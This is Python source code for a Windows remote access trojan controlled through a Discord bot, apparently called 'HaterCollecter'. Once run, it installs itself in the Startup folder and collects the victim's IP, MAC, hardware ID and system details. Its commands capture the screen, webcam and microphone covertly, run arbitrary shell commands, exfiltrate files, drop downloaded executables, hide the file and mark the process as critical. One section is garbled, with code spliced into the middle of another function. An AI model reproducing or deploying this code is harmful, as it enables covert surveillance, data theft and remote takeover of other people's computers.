import discord
from discord.ext import commands, tasks
import requests
import os
from discord import Permissions
import subprocess
import random
import cv2
import shutil
import sys
import sounddevice as sd
import wave
from PIL import ImageGrab
import numpy as np
from io import BytesIO
from time import time
import ctypes
from discord.ext.commands import Context


intents = discord.Intents.all()
intents.all()
intents.guilds = True
intents.messages = True
permissions = discord.Permissions()
permissions.manage_channels = True
permissions.manage_messages = True
intents.members = True
permissions = Permissions()
permissions.administrator = True
client = discord.Client(intents=intents)


token = "YOUR_DISCORD_TOKEN_HERE"

temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)

bot = commands.Bot(command_prefix='!', intents=intents)
computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(
    errors='ignore').strip().splitlines()[2].strip()
cpu = subprocess.run(["wmic", "cpu", "get", "Name"],
                     capture_output=True, text=True).stdout.strip().split('\n')[2]
gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,
                     shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
username = os.getenv("UserName")
hostname = os.getenv("COMPUTERNAME")
hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
ip = requests.get('https://api.ipify.org').text
mac = subprocess.check_output("getmac", shell=True, stdin=subprocess.PIPE,
                              stderr=subprocess.PIPE).decode('utf-8').split("\n")[1].strip()
video_capture = cv2.VideoCapture(0)
frame_width = int(video_capture.get(3))
frame_height = int(video_capture.get(4))

out = cv2.VideoWriter(temp_path + '\\webcam.avi', cv2.VideoWriter_fourcc('M',
                      'J', 'P', 'G'), 30, (frame_width, frame_height))

CHANNEL_ID = None

script_path = os.path.abspath(sys.argv[0])

if sys.platform.startswith('win'):
    startup_path = os.path.join(os.getenv(
        'APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    if not os.path.exists(os.path.join(startup_path, os.path.basename(script_path))):
        shutil.copy(script_path, startup_path)
else:
    pass

with open(f"{temp_path}\\session{random.randint(0,9999999)}.txt", "w+") as userchannel:
    userchannel.write(str(random.randint(0,99999999)))
    userchannel.seek(0)
    channel_name = userchannel.read()

@bot.event
async def on_ready():

    guild = bot.guilds[0] if bot.guilds else None

    if guild:
        all_channels = [channel.name.lower() for channel in guild.channels]

        if channel_name not in all_channels:
            new_channel = await guild.create_text_channel(channel_name)

        channel = discord.utils.get(guild.channels, name=channel_name)

        if channel:
            await channel.send("""```@everyone !!! !helpme for commands.```""")


@bot.command(name="getinfo")
async def sendusername(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    try:

        embed = discord.Embed(
            title="HaterCollecter",
            color=5639644,
            description=f'''```💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n📟 **CPU:** `{cpu}`\n🎮 **GPU:** `{gpu}`\n💾 **RAM:** `{ram}GB````'''
        )
        embed.set_footer(text="0giv HaterCollecter | Created By 0giv")
        embed.set_thumbnail(
            url="https://avatars.githubusercontent.com/u/138109429?v=4")

        await ctx.channel.send(embed=embed)

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name=("ss"))
async def ss(ctx, numberofphoto: int):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    number = 0
    try:
        while not number == numberofphoto:
            number += 1
            image = ImageGrab.grab(
                bbox=None,
                all_screens=True,
                include_layered_windows=False,
                xdisplay=None
            )

            image.save(temp_path + "\\desktopshot.png")
            ss = temp_path + "\\desktopshot.png"

            if ctx.message.content.startswith('!ss'):
                channel = ctx.channel
                file = discord.File(ss, filename='ss.jpg')
                await ctx.channel.send(file=file)

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="ws")
async def webcamshot(ctx, numberofphoto: int):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    number = 0
    wbshot = cv2.VideoCapture(0)
    while not number == numberofphoto:
        number += 1
        return_value, image = wbshot.read()
        cv2.imwrite(temp_path + "\\webcamshot.png", image)
        webcamshotpng = temp_path + "\\webcamshot.png"
        wbshotpng = discord.File(webcamshotpng, filename="webcamshot.png")
        await ctx.channel.send(file=wbshotpng)

    wbshot.release()
    cv2.destroyAllWindows()


@tasks.loop(seconds=1/30)  # For 30FPS.(Recommened.)
async def send_camera_feed():
    ret, frame = video_capture.read()

    if ret:
        _, image = cv2.imencode('.png', frame)
        image_array = np.array(image).tobytes()

        # Create Discor.File using with BytesIO.
        file = discord.File(BytesIO(image_array), filename='image.png')

        channel = bot.get_channel(CHANNEL_ID)
        await channel.send(file=file)


@bot.command(name="wstream")
async def stream(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    channel_names = channel_name + "-stream"
    try:
        guild = bot.guilds[0] if bot.guilds else None
        channel_name_lower = channel_names.lower() + "stream"

        if guild:
            all_channels = [channel.name.lower() for channel in guild.channels]

            if channel_name_lower not in all_channels:
                new_channel = await guild.create_text_channel(channel_name_lower)

            channel = discord.utils.get(
                guild.channels, name=channel_name_lower)

            if channel:
                global CHANNEL_ID
                CHANNEL_ID = channel.id
                send_camera_feed.start()
                await channel.send('```Stream Started!```@everyone')

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="stopstream")
async def stop(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    channel_names = channel_name + "-stream"
    guild = bot.guilds[0] if bot.guilds else None
    channel_name_lower = channel_names.lower() + "stream"
    channel = discord.utils.get(guild.channels, name=channel_name_lower)
    global CHANNEL_ID
    CHANNEL_ID = channel.id
    send_camera_feed.stop()
    cv2.destroyAllWindows()
    await channel.send('```Stopped!```')


@bot.command(name="video")
async def recordvideo(ctx, seconds: int):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return

    start_time = time()
    try:
        # OpenCV VideoCapture
        video_capture = cv2.VideoCapture(0)

        # Define the codec and create a VideoWriter object
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        videofile_path = temp_path + '\\webcam.avi'
        out = cv2.VideoWriter(videofile_path, fourcc, 20.0, (640, 480))

        while True:
            ret, frame = video_capture.read()

            # Record Video
            out.write(frame)

            elapsed_time = time() - start_time
            if elapsed_time >= seconds:
                break

        video_capture.release()
        out.release()
        cv2.destroyAllWindows()

        await ctx.channel.send("```Here It Is!```\n", file=discord.File(videofile_path, filename="webcam.avi"))

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="recordvoice")
async def recordvoice(ctx, seconds: int):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return

    def save(voicefile0, examplenumber=44100):
        register_second = seconds
        register_examplenumber = examplenumber
        # Recording Voice
        voice = sd.rec(int(register_examplenumber * register_second),
                       samplerate=examplenumber, channels=2, dtype='int16')
        sd.wait()

        # Write the Voice File
        with wave.open(voicefile0, 'wb') as wf:
            wf.setnchannels(2)
            # 2-byte (for int16 type)
            wf.setsampwidth(2)
            wf.setframerate(examplenumber)
            wf.writeframes(voice.tobytes())

    voicefile0 = temp_path + "\\voice.wav"
    save(voicefile0)
    voicefile = discord.File(voicefile0, filename="voice.wav")
    await ctx.channel.send('```Here It Is!```\n', file=voicefile)


@bot.command(name="command")
async def command(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    command_string = " ".join(args)
    try:
        result = subprocess.run(command_string, shell=True,
                                capture_output=True, text=True)
        if len(result.stdout) > 2000:
            chunk_size = 1000
            chunks = [result.stdout[i:i+chunk_size]
                      for i in range(0, len(result.stdout), chunk_size)]

            for i, chunk in enumerate(chunks, start=1):
                await ctx.channel.send(f"```Command Output (Part {i}:\n\n{chunk}\n```")
        else:
            await ctx.channel.send(f"```Command Output: \n\n{result.stdout}\n```")

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="gofile")
async def listfile(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    try:
        command_string = " ".join(args)
        os.chdir(command_string)
        result = subprocess.run(
            "dir", shell=True, capture_output=True, text=True)
        chunk_size = 1000
        chunks = [result.stdout[i:i+chunk_size]
                for i in range(0, len(result.stdout), chunk_size)]

        for i, chunk in enumerate(chunks, start=1):
            await ctx.channel.send(f"Command Output (Part {i}):\n```\n{chunk}\n```")
    except Exception as e:
        await ctx.channel.send(f"{e}")



    if ctx.author.voice:
        channel = ctx.author.voice.channel
        voice_channel = await channel.connect()

        
        voice_channel.play(discord.FFmpegPCMAudio(executable="/tam/yol/ffmpeg", source="audio=Microphone"))

    else:
        await ctx.send("Lütfen bir sesli kanala katılın.")@bot.command(name="kill")
async def tasklist(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    command_string = " ".join(args)

    result = subprocess.run("taskkill /F /IM " + command_string, shell=True,
                            capture_output=True, text=True)
    chunk_size = 1000
    chunks = [result.stdout[i:i+chunk_size]
              for i in range(0, len(result.stdout), chunk_size)]

    for i, chunk in enumerate(chunks, start=1):
        await ctx.channel.send(f"```  Tasklist Output (Part {i}):```  \n```\n{chunk}\n```")


@bot.command(name="get")
async def getfile(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    command_string = " ".join(args)

    file = discord.File(command_string)
    try:
        await ctx.channel.send("Here Is Your File!", file=file)
    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="setlang")
async def changelang(ctx, lang):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    try:
        global language
        language = lang
        await ctx.channel.send(f"```Lang Changed: {language}```")
    except Exception as e:
        await ctx.channel.send(f"```Error: {e}```")


@bot.command(name="say")
async def say(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    from gtts import gTTS
    global language
    text = " ".join(args)
    tts = gTTS(text=text, lang=language, slow=False)
    tts.save(temp_path + "/say.mp3")
    sound = temp_path + "/say.mp3"
    try:
        subprocess.Popen(["start", sound], shell=True)
        await ctx.channel.send("```Its Done Sir!```")
    except Exception as e:
        await ctx.channel.send(f"```Error: {e}```")


@bot.command(name="msg")
async def msg(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    import ctypes
    msg = " ".join(args)
    try:
        MB_YESNO = 0x04
        MB_HELP = 0x4000
        ICON_STOP = 0x10
        ctypes.windll.user32.MessageBoxW(
            0, msg, "Error", MB_HELP | MB_YESNO | ICON_STOP)

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="amiadmin")
async def amiadmin(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    import ctypes
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            await ctx.channel.send("```[*] Congrats you're admin!```")
        elif is_admin == False:
            await ctx.channel.send("```[!] Sorry, you're not admin.```")

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="hide")
async def hide(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    import inspect
    try:
        thefile = inspect.getframeinfo(inspect.currentframe()).filename
        os.system(f"attrib +h {thefile}")
        await ctx.channel.send("```The File Hided!```")

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="shutdown")
async def shutdown(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    try:
        await ctx.channel.send("```Okay Sir...```")
        os.system("shutdown /s /t 0")

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="restart")
async def restart(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    try:
        await ctx.channel.send("```Okay Sir...```")
        os.system("shutdown /r /t 0")

    except Exception as e:
        await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="voice")
async def voice(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    voicefile = " ".join(args)

    try:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            url = attachment.url
            response = requests.get(url)

            temp_filename = "remotevoicefile.mp3"
            with open(temp_filename, "wb") as f:
                f.write(response.content)

            subprocess.Popen(["start", temp_filename], shell=True)
    except Exception as e:
        await ctx.channel.send(f"```Error:\n{e}```")


@bot.command(name="wallpaper")
async def wallpaper(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    try:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            url = attachment.url
            response = requests.get(url)

            temp_filename = "remotepngfasdaile.png"
            with open(temp_filename, "wb") as f:
                f.write(response.content)

            # Set the wallpaper
            new_wallpaperpath = os.path.abspath(temp_filename)
            command = f'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{new_wallpaperpath}" /f'
            os.system(command)

            # Update the wallpaper
            os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')

            await ctx.send("```Wallpaper updated successfully!```")
        else:
            await ctx.send("```Please provide an image attachment.```")
    except Exception as e:
        await ctx.send(f"```Error:\n{e}```")


@bot.command(name="website")
async def website(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    url = " ".join(args)
    subprocess.call("start " + url, shell=True)
    await ctx.channel.send("```Command successfuly executed!```")


@bot.command(name="upload")
async def upload(ctx, *args):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    file = " ".join(args)
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        url = attachment.url
        response = requests.get(url)

        temp_filename = "changethename.exe"
        with open(temp_filename, "wb") as f:
            f.write(response.content)

        await ctx.channel.send(f"```File Uploaded to {os.getcwd()}\\{temp_filename} !```")


@bot.command(name="critproc")
async def critproc(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(
            20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
        await ctx.channel.send("```Command Exucuted!```")
    except Exception as e:
        await ctx.channel.send("```Command can not be Exacutable...```")


@bot.command(name="helpme")
async def helpmsg(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    await ctx.channel.send(r"""```
!helpme : Shows Commands. 
!ss (number) : Take Screenshot.
!getinfo : Get Them Info.
!recordvoice (second) : Record a Voice File.
!ws (number) : Webcamshot.
!wstream :Real Time Photos.
!stopstream :Stop Real Time Photos.
!video (second) : Record Video.
!command (command) : Sends Commands to Target.
!gofile (folder name) : Change Directory With That.
!kill (procces) : Kill a Task.
!hide : Hide App.
!setlang (lang code) : Set Language Before Using !say. 
!say (custom input) : Say Something Nice to Target.
!amiadmin : Checks If You Are Admin or Not.
!get (file or file path) : Get the File In the Target.
!voice (file) : Upload a Voice File Into Target and Run It.
!shutdown : Closes The PC.
!restart : Restart The Pc.
!msg (custom input) : Send a MessageBox.
!wallpaper (picture) : Change the Wallpaper.(only png.)
!critproc : It Make The File has a Critical Process.
!upload (file) : Upload a File.
!website (website url) : Go to the Website.  
DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
    example usage : !ws 10 it will take 10 webcamshot for a second.
    example usage : !recordvoice 10 it will record the voice for 10 seconds.
    example usage : !video 10 it will record the webcam for 10 seconds.
    example usage : !ss 4 it will take 4 ss for a second.
    example usage : !voice (voice file.)
    example usage : !msg (custom sentences.)
    example usage : !say (custom sentences.)
    example usage : !setlang (lang code.)
    example usage : !get (the file path.)
    example usage : !wallpaper (any picture file.)
    example usage : !kill (procces.)
    example usage : !gofile (folder.)
    example usage : !command (command.)
    example usage : !website (https://google.com)
    example usage : !upload (file.)
!cmd : You Can See the Best CMD Commands.(Also You Can Find On Net.) ```                                                        
""")


@bot.command(name="cmd")
async def cmd(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    await ctx.channel.send(r"""```

Usage: dir
Example: Lists files and directories in the current directory.
cls (Clear Screen):

Usage: cls
Example: Clears the Command Prompt screen.
ipconfig (IP Configuration):

Usage: ipconfig
Example: Displays information about network interfaces and IP configuration.
ping (Ping a Server):

Usage: ping [hostname or IP address]
Example: ping www.google.com
netstat (Network Statistics):

Usage: netstat -a
Example: Displays active network connections.
tasklist (List Running Processes):

Usage: tasklist
Example: Lists all running processes on the system.
taskkill (Terminate a Process):

Usage: taskkill /F /IM [process name]
Example: taskkill /F /IM notepad.exe
systeminfo (System Information):

Usage: systeminfo
Example: Displays detailed information about the computer's configuration.
sfc (System File Checker):

Usage: sfc /scannow
Example: Scans and repairs system files.
chkdsk (Check Disk):

Usage: chkdsk /f
Example: Checks and repairs disk errors.

gpupdate (Group Policy Update):
Usage: gpupdate /force
Example: Forces an immediate update of Group Policy.

shutdown (Shutdown or Restart):
Usage: shutdown /s /t 0 (Shutdown)
Usage: shutdown /r /t 0 (Restart)
                   
mklink (Create Symbolic Links):
Usage: mklink /d [link] [target]
Example: mklink /d C:\LinkToFolder C:\TargetFolder
copy (Copy Files):

Usage: copy [source] [destination]
Example: copy C:\File.txt D:\Backup
xcopy (Extended Copy):

Usage: xcopy [source] [destination] /E /H /C /K /Y
Example: xcopy C:\SourceFolder D:\DestinationFolder /E /H /C /K /Y
attrib (File Attribute Manipulation):

Usage: attrib +h +s [file or folder]
Example: Hides and sets a file or folder as system.

md (Make Directory):
Usage: md [directory name]
Example: md NewFolder
                   ```""")


bot.run(token)
